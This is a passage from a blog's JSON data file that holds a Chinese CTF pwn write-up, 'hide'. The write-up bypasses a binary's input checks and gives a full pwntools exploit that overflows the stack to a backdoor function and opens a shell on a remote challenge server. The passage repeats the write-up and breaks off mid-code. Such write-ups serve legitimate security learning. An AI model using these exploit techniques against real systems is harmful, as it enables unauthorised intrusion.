class=\"number\">0</span>)+p64(libcbase+one_gadget[<span class=\"number\">0</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"hide","date":"2023-01-02T11:54:26.000Z","_content":"\n好像是美团的比赛，纯纯的逆向题\n\n<!-- more -->\n\n捉迷藏，有后门，控制函数流程到栈溢出的函数。\n\n主要要绕的就是两种，一种是要求控制input_val()的值，另一种是fksth()，会和一个指定的字符串进行比较，要求你控制比较的结果，不过后面你的输出会被xor修改。\n\ninput_val:相当于atoi()把你输入的字符串转化为数字，以' '作为结束符，长度最大为19\n\n```c\nint input_val()\n{\n  int v0; // eax\n  char nptr[27]; // [rsp+0h] [rbp-20h] BYREF\n  char v3[5]; // [rsp+1Bh] [rbp-5h]\n\n  v3[4] = 0;\n  *(_DWORD *)v3 = (unsigned __int8)getchar();   // 输入v3[0],v3[1]=0 unsigned int8 0~255\n  while ( v3[0] != 32 && *(int *)&v3[1] <= 18 ) // v3[1]是循环次数最多19次，输入v3[0]==32==' '可以强行终止循环\n  {\n    v0 = (*(_DWORD *)&v3[1])++;                 // v0=v3[1];v3[1]++;即每次写nptr的1byte\n    nptr[v0] = v3[0];                           // nptr每1byte用v3[0]赋值\n    v3[0] = getchar();                          // 输入v3[0]\n  }\n  nptr[*(int *)&v3[1]] = 0;                     // 加个结束符\n  return atoi(nptr);\n}\n```\n\n\n\n\nfks_sth:类似strcmp()，不过返回的是str1和str2各位的ascii码的差的和\n\n```c\n__int64 __fastcall fksth(__int64 a1, __int64 a2)\n{\n  int i; // [rsp+18h] [rbp-8h]\n  unsigned int v4; // [rsp+1Ch] [rbp-4h]\n\n  v4 = 0;\n  for ( i = 0; *(_BYTE *)(i + a1) && *(_BYTE *)(i + a2); ++i )\n    v4 += *(char *)(i + a1) - *(char *)(i + a2);\n  return v4;\n}\n```\n\n第一个if需要得到false\n\n```c\n  input_val();\n  input_val();\n  input_val();\n  v4 = input_val();\n  input_val();\n  input_val();\n  v5 = input_val();\n  if ( v5 + v4 + input_val() == 2187 )          // 要false，随便输一下不等于即可\n```\n\n```python\nfor i in range(7):\n\tinput_val(32)\np.sendline(p8(32))\n\n//随便sendline()8次就可以了\n\n```\n\n第二个if需要true\n\n```c\ninput_line((__int64)&key2, 51uLL);//输入一行作为Key2，共51byte\nkey2 ^= 1043327323u;//xor处理\nif ( (unsigned int)fksth((__int64)&key2, (__int64)\"JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe\") )\n```\n\n其实不用太仔细去考究他的xor，甚至原封不动输回去也可以过。\n\n```python\nword2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'\nkey2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'\n\np.sendline(key2)\n```\n\n第三个if也要true\n\n```c\ninput_line((__int64)&key3, 53uLL);//输入一行作为Key2，共53byte\nkey3 ^= 3585375674u;\nif ( (unsigned int)fksth((__int64)&key3, (__int64)\"eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR\") )\n```\n\n同上\n\n```python\nword3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'\np.sendline(word3)\n```\n\n第四个if也要true\n\n```c\ninput_line((__int64)&key4, 34uLL);\nHIBYTE(key4) ^= 0x8Bu;\n*(_WORD *)((char *)&key4 + 1) ^= 0x20C1u;\nLOBYTE(key4) = key4 ^ 0x30;\nif ( (unsigned int)fksth((__int64)&key4, (__int64)\"wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO\") )\n```\n\n花里胡哨的，但也同上\n\n```python\nword4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'\np.send(word4)\n```\n\n第五个if也要true\n\n```c\nv6 = input_val();\nv7 = input_val();\nv8 = input_val();\nkey51 = input_val();\nkey52 = input_val();\nv11 = input_val();\nv12 = input_val();\nv13 = input_val();\nif ( key51 - key52 == 9254 )\n```\n\n让key51=9255,key52=1即可\n\n```python\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\np.sendline('9255 ')\np.sendline('1 ')\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n```\n\n第六个if也要true\n\n```c\ninput_line((__int64)&key6, 42uLL);\nkey6 ^= 0xE2FC7F3C;\nif ( !(unsigned int)fksth((__int64)&key6, (__int64)\"vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM\") )\n```\n\n只要ascii码小于每一位就可以了\n\n```python\nword6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'\nkey6  = '\\x3c\\x7f\\xfc\\xe2'\nkey6=key6.ljust(42,'\\x00')\np.send(key6)\n```\n\n之后栈溢出返回backdoor()即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\nelf=ELF(\"./pwn\")\n#p=process(\"./pwn\")\np=remote('39.106.133.19',31888)\n\npadding=0xf+0x8\nbackdoor=0x40132c\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\ndef input_val(num):\n\tp.send(p8(num))\n#first if is false\nfor i in range(7):\n\tinput_val(32)\np.sendline(p8(32))\n\nword2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'\nkey2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'\n\np.sendline(key2)\n\nword3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'\n\np.sendline(word3)\n\nword4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'\nkey4 = 'vGv}uTiSvbNgLnMp~f``cnBHGN}tNmHXuC'\n\np.send(word4)\n\n\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\np.sendline('9255 ')\n\n\np.sendline('1 ')\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\n\nword6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'\n#print(word6.lower())\nxor=3808198460\nkey6  = '\\x3c\\x7f\\xfc\\xe2'\nkey6=key6.ljust(42,'\\x00')\n\n\n\n#print(data)\n#print(key6)\n#debug()\n\np.send(key6)\n\n\npayload='a'*padding+p64(backdoor)\np.sendline(payload.ljust(0x37,'\\x00'))\n\np.interactive()\n\n#solved\n```","source":"_posts/hide.md","raw":"---\ntitle: hide\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- reverse\n---\n\n好像是美团的比赛，纯纯的逆向题\n\n<!-- more -->\n\n捉迷藏，有后门，控制函数流程到栈溢出的函数。\n\n主要要绕的就是两种，一种是要求控制input_val()的值，另一种是fksth()，会和一个指定的字符串进行比较，要求你控制比较的结果，不过后面你的输出会被xor修改。\n\ninput_val:相当于atoi()把你输入的字符串转化为数字，以' '作为结束符，长度最大为19\n\n```c\nint input_val()\n{\n  int v0; // eax\n  char nptr[27]; // [rsp+0h] [rbp-20h] BYREF\n  char v3[5]; // [rsp+1Bh] [rbp-5h]\n\n  v3[4] = 0;\n  *(_DWORD *)v3 = (unsigned __int8)getchar();   // 输入v3[0],v3[1]=0 unsigned int8 0~255\n  while ( v3[0] != 32 && *(int *)&v3[1] <= 18 ) // v3[1]是循环次数最多19次，输入v3[0]==32==' '可以强行终止循环\n  {\n    v0 = (*(_DWORD *)&v3[1])++;                 // v0=v3[1];v3[1]++;即每次写nptr的1byte\n    nptr[v0] = v3[0];                           // nptr每1byte用v3[0]赋值\n    v3[0] = getchar();                          // 输入v3[0]\n  }\n  nptr[*(int *)&v3[1]] = 0;                     // 加个结束符\n  return atoi(nptr);\n}\n```\n\n\n\n\nfks_sth:类似strcmp()，不过返回的是str1和str2各位的ascii码的差的和\n\n```c\n__int64 __fastcall fksth(__int64 a1, __int64 a2)\n{\n  int i; // [rsp+18h] [rbp-8h]\n  unsigned int v4; // [rsp+1Ch] [rbp-4h]\n\n  v4 = 0;\n  for ( i = 0; *(_BYTE *)(i + a1) && *(_BYTE *)(i + a2); ++i )\n    v4 += *(char *)(i + a1) - *(char *)(i + a2);\n  return v4;\n}\n```\n\n第一个if需要得到false\n\n```c\n  input_val();\n  input_val();\n  input_val();\n  v4 = input_val();\n  input_val();\n  input_val();\n  v5 = input_val();\n  if ( v5 + v4 + input_val() == 2187 )          // 要false，随便输一下不等于即可\n```\n\n```python\nfor i in range(7):\n\tinput_val(32)\np.sendline(p8(32))\n\n//随便sendline()8次就可以了\n\n```\n\n第二个if需要true\n\n```c\ninput_line((__int64)&key2, 51uLL);//输入一行作为Key2，共51byte\nkey2 ^= 1043327323u;//xor处理\nif ( (unsigned int)fksth((__int64)&key2, (__int64)\"JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe\") )\n```\n\n其实不用太仔细去考究他的xor，甚至原封不动输回去也可以过。\n\n```python\nword2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'\nkey2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'\n\np.sendline(key2)\n```\n\n第三个if也要true\n\n```c\ninput_line((__int64)&key3, 53uLL);//输入一行作为Key2，共53byte\nkey3 ^= 3585375674u;\nif ( (unsigned int)fksth((__int64)&key3, (__int64)\"eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR\") )\n```\n\n同上\n\n```python\nword3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'\np.sendline(word3)\n```\n\n第四个if也要true\n\n```c\ninput_line((__int64)&key4, 34uLL);\nHIBYTE(key4) ^= 0x8Bu;\n*(_WORD *)((char *)&key4 + 1) ^= 0x20C1u;\nLOBYTE(key4) = key4 ^ 0x30;\nif ( (unsigned int)fksth((__int64)&key4, (__int64)\"wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO\") )\n```\n\n花里胡哨的，但也同上\n\n```python\nword4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'\np.send(word4)\n```\n\n第五个if也要true\n\n```c\nv6 = input_val();\nv7 = input_val();\nv8 = input_val();\nkey51 = input_val();\nkey52 = input_val();\nv11 = input_val();\nv12 = input_val();\nv13 = input_val();\nif ( key51 - key52 == 9254 )\n```\n\n让key51=9255,key52=1即可\n\n```python\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\np.sendline('9255 ')\np.sendline('1 ')\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n```\n\n第六个if也要true\n\n```c\ninput_line((__int64)&key6, 42uLL);\nkey6 ^= 0xE2FC7F3C;\nif ( !(unsigned int)fksth((__int64)&key6, (__int64)\"vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM\") )\n```\n\n只要ascii码小于每一位就可以了\n\n```python\nword6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'\nkey6  = '\\x3c\\x7f\\xfc\\xe2'\nkey6=key6.ljust(42,'\\x00')\np.send(key6)\n```\n\n之后栈溢出返回backdoor()即可get shell。\n\nexp:\n\n```python\nfrom pwn import*\nelf=ELF(\"./pwn\")\n#p=process(\"./pwn\")\np=remote('39.106.133.19',31888)\n\npadding=0xf+0x8\nbackdoor=0x40132c\n\ndef debug():\n\tgdb.attach(p)\n\tpause()\n\ndef input_val(num):\n\tp.send(p8(num))\n#first if is false\nfor i in range(7):\n\tinput_val(32)\np.sendline(p8(32))\n\nword2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe'\nkey2 = 'JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf'\n\np.sendline(key2)\n\nword3 =  'eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR'\n\np.sendline(word3)\n\nword4 = 'wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO'\nkey4 = 'vGv}uTiSvbNgLnMp~f``cnBHGN}tNmHXuC'\n\np.send(word4)\n\n\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\np.sendline('9255 ')\n\n\np.sendline('1 ')\n\nfor i in range(3):\n    input_val(32)\n    sleep(0.01)\n\n\nword6 = 'vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM'\n#print(word6.lower())\nxor=3808198460\nkey6  = '\\x3c\\x7f\\xfc\\xe2'\nkey6=key6.ljust(42,'\\x00')\n\n\n\n#print(data)\n#print(key6)\n#debug()\n\np.send(key6)\n\n\npayload='a'*padding+p64(backdoor)\np.sendline(payload.ljust(0x37,'\\x00'))\n\np.interactive()\n\n#solved\n```","slug":"hide","published":1,"updated":"2023-01-02T15:44:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag300425ouda2894zlm","content":"<p>好像是美团的比赛，纯纯的逆向题</p>\n<span id=\"more\"></span>\n\n<p>捉迷藏，有后门，控制函数流程到栈溢出的函数。</p>\n<p>主要要绕的就是两种，一种是要求控制input_val()的值，另一种是fksth()，会和一个指定的字符串进行比较，要求你控制比较的结果，不过后面你的输出会被xor修改。</p>\n<p>input_val:相当于atoi()把你输入的字符串转化为数字，以’ ‘作为结束符，长度最大为19</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">input_val</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> nptr[<span class=\"number\">27</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">5</span>]; <span class=\"comment\">// [rsp+1Bh] [rbp-5h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3[<span class=\"number\">4</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)v3 = (<span class=\"type\">unsigned</span> __int8)getchar();   <span class=\"comment\">// 输入v3[0],v3[1]=0 unsigned int8 0~255</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v3[<span class=\"number\">0</span>] != <span class=\"number\">32</span> &amp;&amp; *(<span class=\"type\">int</span> *)&amp;v3[<span class=\"number\">1</span>] &lt;= <span class=\"number\">18</span> ) <span class=\"comment\">// v3[1]是循环次数最多19次，输入v3[0]==32==&#x27; &#x27;可以强行终止循环</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v0 = (*(_DWORD *)&amp;v3[<span class=\"number\">1</span>])++;                 <span class=\"comment\">// v0=v3[1];v3[1]++;即每次写nptr的1byte</span></span><br><span class=\"line\">    nptr[v0] = v3[<span class=\"number\">0</span>];                           <span class=\"comment\">// nptr每1byte用v3[0]赋值</span></span><br><span class=\"line\">    v3[<span class=\"number\">0</span>] = getchar();                          <span class=\"comment\">// 输入v3[0]</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  nptr[*(<span class=\"type\">int</span> *)&amp;v3[<span class=\"number\">1</span>]] = <span class=\"number\">0</span>;                     <span class=\"comment\">// 加个结束符</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> atoi(nptr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n<p>fks_sth:类似strcmp()，不过返回的是str1和str2各位的ascii码的差的和</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">fksth</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + a2); ++i )</span><br><span class=\"line\">    v4 += *(<span class=\"type\">char</span> *)(i + a1) - *(<span class=\"type\">char</span> *)(i + a2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>第一个if需要得到false</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">v4 = input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">input_val();</span><br><span class=\"line\">v5 = input_val();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v5 + v4 + input_val() == <span class=\"number\">2187</span> )          <span class=\"comment\">// 要false，随便输一下不等于即可</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tinput_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">p.sendline(p8(<span class=\"number\">32</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">//随便sendline()<span class=\"number\">8</span>次就可以了</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>第二个if需要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key2, <span class=\"number\">51uLL</span>);<span class=\"comment\">//输入一行作为Key2，共51byte</span></span><br><span class=\"line\">key2 ^= <span class=\"number\">1043327323u</span>;<span class=\"comment\">//xor处理</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key2, (__int64)<span class=\"string\">&quot;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>其实不用太仔细去考究他的xor，甚至原封不动输回去也可以过。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCe&#x27;</span></span><br><span class=\"line\">key2 = <span class=\"string\">&#x27;JlQZtdeJUoYHwWVHWPoRnkWCCzTUIJfxSFyySvunXdHQwaPgqCf&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(key2)</span><br></pre></td></tr></table></figure>\n\n<p>第三个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key3, <span class=\"number\">53uLL</span>);<span class=\"comment\">//输入一行作为Key2，共53byte</span></span><br><span class=\"line\">key3 ^= <span class=\"number\">3585375674u</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key3, (__int64)<span class=\"string\">&quot;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>同上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word3 =  <span class=\"string\">&#x27;eRoTxWxqvoHTuwDKOzuPpBLJUNlbfmjvbyOJyZXYAJqkspYTkvatR&#x27;</span></span><br><span class=\"line\">p.sendline(word3)</span><br></pre></td></tr></table></figure>\n\n<p>第四个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key4, <span class=\"number\">34uLL</span>);</span><br><span class=\"line\">HIBYTE(key4) ^= <span class=\"number\">0x8B</span>u;</span><br><span class=\"line\">*(_WORD *)((<span class=\"type\">char</span> *)&amp;key4 + <span class=\"number\">1</span>) ^= <span class=\"number\">0x20C1</span>u;</span><br><span class=\"line\">LOBYTE(key4) = key4 ^ <span class=\"number\">0x30</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key4, (__int64)<span class=\"string\">&quot;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>花里胡哨的，但也同上</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word4 = <span class=\"string\">&#x27;wLstsZkXukNiHeHyxjklnbIDJBvxCaCTxO&#x27;</span></span><br><span class=\"line\">p.send(word4)</span><br></pre></td></tr></table></figure>\n\n<p>第五个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v6 = input_val();</span><br><span class=\"line\">v7 = input_val();</span><br><span class=\"line\">v8 = input_val();</span><br><span class=\"line\">key51 = input_val();</span><br><span class=\"line\">key52 = input_val();</span><br><span class=\"line\">v11 = input_val();</span><br><span class=\"line\">v12 = input_val();</span><br><span class=\"line\">v13 = input_val();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( key51 - key52 == <span class=\"number\">9254</span> )</span><br></pre></td></tr></table></figure>\n\n<p>让key51=9255,key52=1即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;9255 &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;1 &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    input_val(<span class=\"number\">32</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.01</span>)</span><br></pre></td></tr></table></figure>\n\n<p>第六个if也要true</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">input_line((__int64)&amp;key6, <span class=\"number\">42uLL</span>);</span><br><span class=\"line\">key6 ^= <span class=\"number\">0xE2FC7F3C</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fksth((__int64)&amp;key6, (__int64)<span class=\"string\">&quot;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&quot;</span>) )</span><br></pre></td></tr></table></figure>\n\n<p>只要ascii码小于每一位就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">word6 = <span class=\"string\">&#x27;vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM&#x27;</span></span><br><span class=\"line\">key6  = <span class=\"string\">&#x27;\\x3c\\x7f\\xfc\\xe2&#x27;</span></span><br><span class=\"line\">key6=key6.ljust(<span class=\"number\">42</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">p.send(key6)</span><br></pre></td></tr></table></figure>\n\n<p>之后栈溢出返回backdoor()即可get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;39.106.133.19&#x27;</span>,<span class=\"number\">31888</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0xf</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">backdoor=<span class=\"number\">0x40132c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span 